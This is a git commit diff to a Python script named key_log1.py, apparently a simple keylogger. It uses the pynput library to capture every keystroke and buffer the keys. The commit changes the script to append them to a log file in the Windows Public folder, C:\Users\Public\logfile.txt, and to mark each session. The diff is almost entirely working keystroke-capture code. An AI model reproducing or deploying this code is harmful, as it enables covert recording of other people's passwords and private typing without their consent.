c30480c514ebdf5e52682acb63d717ce178c3ccf
Anurag Sharma <thisisanuragsharma@gmail.com>
2019-06-23 22:59:41 +0530

    Update key_log1.py

--- key_log1.py
+++ key_log1.py
@@ -1,14 +1,21 @@
 from pynput.keyboard import Key, Listener
 k=[]# The Buffer used to load key strokes and write them on file
+file_path="c:\\Users\\Public\\logfile.txt"# Can specify the path of the log file to be saved
+buff_len=10# Can change the desired length of the buffer to be checked before writing
+with open (file_path,"a+") as f:
+    f.write("\n\n----New Session---\n\n")
 def on_press(key):
     global k
     print("{} pressed".format(key))
     if('Key.backspace'==str(key)):
         if(len(k)):
             k=k[:-1]
+        else:
+            with open (file_path,"a+") as f:
+                f.write("<-")#Represents backspace stroke which was not handled
     else:
         k.append(str(key))
-        if(len(k)>=10):# Can change the desired length of the buffer to be checked before writing
+        if(len(k)>=buff_len):
             writing()
             print(k)
             k=[]
@@ -17,7 +24,7 @@ def on_release(key):
         return
 def writing():
     global k
-    with open("logfile.txt","a+") as f:# Can specify the path of the log file to be saved
+    with open(file_path,"a+") as f:
         for x in k:
             x=x.replace("'","")
             if (x=='Key.space'):
